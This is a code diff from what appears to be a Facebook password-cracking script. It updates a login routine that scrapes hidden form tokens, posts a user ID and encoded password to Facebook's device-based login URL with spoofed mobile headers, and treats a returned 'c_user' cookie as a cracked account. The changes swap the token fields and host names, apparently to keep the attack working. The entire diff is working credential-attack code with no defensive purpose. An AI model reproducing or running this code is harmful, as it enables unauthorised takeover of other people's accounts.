@@ -1731,19 +1731,11 @@ def d(uid,pwx,tl):
             Session = requests.Session()
             free_fb = Session.get('https://touch.facebook.com').text
             data = {
-            "m_ts": re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
-            "li": re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
+            "jazoest": re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
+            "lsd": re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
             "try_number": 0,
             "unrecognized_tries": 0,
             "email": uid,
-            "prefill_contact_point": "",
-            "prefill_source": "",
-            "prefill_type": "",
-            "first_prefill_source": "",
-            "first_prefill_type": "",
-            "had_cp_prefilled": False,
-            "had_password_prefilled": False,
-            "is_smart_lock": False,
             "bi_xrwh": 0,
             "encpass": "#PWD_BROWSER:0:{}:{}".format(str(time.time()).split('.')[0], pw),}
             headers =  {
@@ -1751,7 +1743,7 @@ def d(uid,pwx,tl):
             'Accept-Encoding': 'gzip, deflate',
             'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
             'Connection': 'keep-alive',
-            'Host': 'web.facebook.com',
+            'Host': 'www.facebook.com',
             'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
             'cache-control': 'max-age=0',
             'dpr': '3',
@@ -1762,7 +1754,7 @@ def d(uid,pwx,tl):
             'sec-fetch-user': '?1',
             'upgrade-insecure-requests': '1',
             'viewport-width': '400'}
-            url = 'https://web.facebook.com/login/device-based/regular/login/?login_attempt=1&next=https%3A%2F%2Fdevelopers.facebook.com%2Fdocs%2Ffacebook-login%2Fios&lwv=100'
+            url = 'https://www.facebook.com/login/device-based/regular/login/?login_attempt=1&next=https%3A%2F%2Fdevelopers.facebook.com%2Fdocs%2Ffacebook-login%2Fios&lwv=100'
             po = Session.post(url, data=data, headers=headers, allow_redirects=False).text
             response = Session.cookies.get_dict().keys()
             if "c_user" in response:
